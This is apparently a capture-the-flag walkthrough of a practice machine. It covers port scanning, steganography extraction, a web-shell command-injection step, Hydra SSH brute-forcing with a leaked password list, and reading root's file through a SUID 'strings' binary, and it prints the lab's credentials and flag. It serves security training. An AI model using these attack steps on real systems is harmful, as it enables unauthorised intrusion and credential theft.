#### 1. Scanning

```
nmap -A 10.10.208.166    
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-02 05:45 EST
Nmap scan report for 10.10.208.166
Host is up (0.060s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Jack-of-all-trades!
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.26 seconds
```

There are two open ports: 22 and 80. Funny thing that services were inverted: http is at 22 and ssh is at 80

<br />

#### 2. Curl 22

I curl the address `curl http://10.10.208.166:22` and see an interesting message:

```
<html>
	<head>
		<title>Jack-of-all-trades!</title>
		<link href="assets/style.css" rel=stylesheet type=text/css>
	</head>
	<body>
		<img id="header" src="assets/header.jpg" width=100%>
		<h1>Welcome to Jack-of-all-trades!</h1>
		<main>
			<p>My name is Jack. I'm a toymaker by trade but I can do a little of anything -- hence the name!<br>I specialise in making children's toys (no relation to the big man in the red suit - promise!) but anything you want, feel free to get in contact and I'll see if I can help you out.</p>
			<p>My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that's all behind me. I'm invested in other pursuits now!</p>
			<p>Please bear with me; I'm old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don't worry, I <em>always</em> clear up after myself.</p>
			<p>I love dinosaurs. I have a <em>huge</em> collection of models. Like this one:</p>
			<img src="assets/stego.jpg">
			<p>I make a lot of models myself, but I also do toys, like this one:</p>
			<img src="assets/jackinthebox.jpg">
			<!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
			<!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
			<p>I hope you choose to employ me. I love making new friends!</p>
			<p>Hope to see you soon!</p>
			<p id="signature">Jack</p>
		</main>
	</body>
```

So there are three links to check:

`/assets/header.jpg` --> stego?

`assets/stego.jpg` --> most likely with some hidden message inside

`assets/jackinthebox.jpg` --> maybe another stenography?

`/recovery.php` --> probably some panel to login. There is also a base64 encoded line so after decoding

```
echo "UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==" | base64 -d > decoded
```
it gives

`Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq`

So I also have a password `u?WtKSraq`

I also checked if it possible to ssh a machine with `jack:u?WtKSraq` but it wasn't possible.

<br />

#### 3. Checking `/assets/stego.jpg`

I download the file with wget and run steghide

`steghide info stego.jpg` 

and it asks me for a passphrase, so I enter previously found password `u?WtKSraq`

and see there is `creds.txt` hidden inside it.

```
steghide info stego.jpg     
"stego.jpg":
  format: jpeg
  capacity: 1.9 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "creds.txt":
    size: 58.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```

after extraction `steghide extract -sf stego.jpg` I get that file but it is a rabbit hole:

```
cat creds.txt  
Hehe. Gotcha!

You're on the right path, but wrong image!
```

<br />

#### 4. Checking `/assets/jackinthebox.jpg`

I do the same as previously, however steghide also asks for a passphrase which I do not have at the moment. I will move on to third link and leave it for now.

<br />

#### 5. Checking `/recovery.php`

I can't access the link with browser, so I will curl once again

`curl 10.10.208.166:22/recovery.php`


and this is a message shown:

```		
<!DOCTYPE html>
<html>
	<head>
		<title>Recovery Page</title>
		<style>
			body{
				text-align: center;
			}
		</style>
	</head>
	<body>
		<h1>Hello Jack! Did you forget your machine password again?..</h1>	
		<form action="/recovery.php" method="POST">
			<label>Username:</label><br>
			<input name="user" type="text"><br>
			<label>Password:</label><br>
			<input name="pass" type="password"><br>
			<input type="submit" value="Submit">
		</form>
		<!-- GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  -->
		 
	</body>
</html>
```

I stuck here for a long time and it turned out I missed one thing. Previously found message says `Remember to wish Johny Graves well with his crypto jobhunting!` 

and I forgot to google his name and check for example twitter. That was a bull's eye cause he actually has one `GravyJohny` and there is a clue on how to cope with decoded message:

```
My Favourite Crypto Method:
First encode your message with a ROT13 cipher. Next Convert it to Hex. Finally convert the result into Base32.
It's uncrackable!
```
<br />

So I ran cyberchef, typed the code and:

- decoded from base32 I get hex:

```
45727a727a6f72652067756e67206775722070657271726167766e79662067622067757220657270626972656c207962747661206e657220757671717261206261206775722075627a72636e7472212056207861626a2075626a20736265747267736879206c6268206e65722c20666220757265722766206e20757661673a206f76672e796c2f3247694c443246
```
- decoded from hex gives rot13:

`Erzrzore gung gur perqragvnyf gb gur erpbirel ybtva ner uvqqra ba gur ubzrcntr! V xabj ubj sbetrgshy lbh ner, fb urer'f n uvag: ovg.yl/2GiLD2F`

- decoded from Rot13 gives ascii:

`Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S`

Hint shows a dinosaur, so after quick check it is `stego.jpg` which already turned out to be a rabbit hole!!!

<br />

#### 6. Checking `/assets/header.jpg`

I download last image, extract the file with steghide but was asked once again for a passphrase, so I entered already found one `u?WtKSraq` which seemed to work:

```
steghide extract -sf header.jpg                                         1 ⨯
Enter passphrase: 
wrote extracted data to "cms.creds".
                                                                                
┌──(kali㉿kali)-[~]
└─$ cat cms.creds                     
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY
```
<br />

#### 7. Moving on with access

There is a way to overcome browser restriction and to view website even if it is on port 22.

We need to access `about:config` then search for `network.security.ports.banned.override`  and add `22` as a new value (string).

<br />

Once done, I can easily access  `10.10.208.166:22/recovery.php` and enter `jackinthebox:TplFxiSHjY` which leads me to another page:

`/nnxhweOV/index.php` and it says `GET me a 'cmd' and I'll run it for you Future-Jack`

so I added `?cmd=id` and got:

```
GET me a 'cmd' and I'll run it for you Future-Jack.
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

It seems that website is vulerable to RCE (Remote Code Execution)

So I tried `?cmd=ls /home` and found a list which is a dictionary for `jack` user

I viewed it with `?cmd=cat /home/jacks_password_list`

```
GET me a 'cmd' and I'll run it for you Future-Jack.
*hclqAzj+2GC+=0K
eN<A@n^zI?FE$I5,
X<(@zo2XrEN)#MGC
,,aE1K,nW3Os,afb
ITMJpGGIqg1jn?>@
0HguX{,fgXPE;8yF
sjRUb4*@pz<*ZITu
[8V7o^gl(Gjt5[WB
yTq0jI$d}Ka<T}PD
Sc.[[2pL<>e)vC4}
9;}#q*,A4wd{<X.T
M41nrFt#PcV=(3%p
GZx.t)H$&awU;SO<
.MVettz]a;&Z;cAC
2fh%i9Pr5YiYIf51
TDF@mdEd3ZQ(]hBO
v]XBmwAk8vk5t3EF
9iYZeZGQGG9&W4d1
8TIFce;KjrBWTAY^
SeUAwt7EB#fY&+yt
n.FZvJ.x9sYe5s5d
8lN{)g32PG,1?[pM
z@e1PmlmQ%k5sDz@
ow5APF>6r,y4krSo
ow5APF>6r,y4krSo
```

<br />

Now is the time to run hydra using that list and to find a ssh password for `jack`

I got it after some time:

```
hydra -l jack -P dict.txt ssh://10.10.165.245:80 

[80][ssh] host: 10.10.165.245   login: jack   password: ITMJpGGIqg1jn?>@

```

<br />

#### 8. SSH to machine

I logged in and check if jack has sudo privileges, but unfortunately not. Next, I viewed his home and instead of a flag found out `user.jpg`

```
jack@jack-of-all-trades:~$ ls -al
total 312
drwxr-x--- 3 jack jack   4096 Feb 29  2020 .
drwxr-xr-x 3 root root   4096 Feb 29  2020 ..
lrwxrwxrwx 1 root root      9 Feb 29  2020 .bash_history -> /dev/null
-rw-r--r-- 1 jack jack    220 Feb 29  2020 .bash_logout
-rw-r--r-- 1 jack jack   3515 Feb 29  2020 .bashrc
drwx------ 2 jack jack   4096 Feb 29  2020 .gnupg
-rw-r--r-- 1 jack jack    675 Feb 29  2020 .profile
-rwxr-x--- 1 jack jack 293302 Feb 28  2020 user.jpg
```

I run python server `python -m SimpleHTTPServer 8000` and download that file to my machine, as probably there is some stuff hidden inside.

Apparently, it does not need to be extracted as flag is not hidden.

<br />

#### 9. Getting root

I've already checked of jack has sudo but no. Second step will be checking suid files:

`file / -perm -u=s -type f 2>/dev/null`

which gave me a list:

```
jack@jack-of-all-trades:/home$ find / -type f -perm -u=s 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/usr/bin/chsh
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/strings
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/procmail
/usr/sbin/exim4
/bin/mount
/bin/umount
/bin/su
```

The odd one is `/usr/bin/strings` which normally doesn't have any special permissions as it is a very useful command to view characters from a file (frequently used in stegnographhy challenges)

In this case, I read the flag

```
jack@jack-of-all-trades:/home$ /usr/bin/strings /root/root.txt
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
jack@jack-of-all-trades:/home$ 
```

Bingo. This wone was really interesting: RCE, lot's of stegnography, hydra, suid. Congratulations to an author :)
